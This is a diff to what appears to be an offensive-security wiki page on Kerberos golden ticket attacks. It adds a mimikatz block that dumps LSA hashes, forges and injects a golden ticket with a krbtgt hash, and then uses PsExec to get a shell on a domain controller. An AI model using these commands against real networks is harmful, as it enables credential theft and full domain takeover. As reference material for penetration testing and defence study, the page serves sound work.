@@ -33,3 +33,17 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 **Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like you can not get a shell via winrm).
 
 ****[**More information about Golden Tickets from ired.team**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)****
+
+****
+
+{% code title="mimikatz #" %}
+```
+privilege::debug
+lsadump::lsa /patch
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+misc::cmd
+
+
+C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
+```
+{% endcode %}
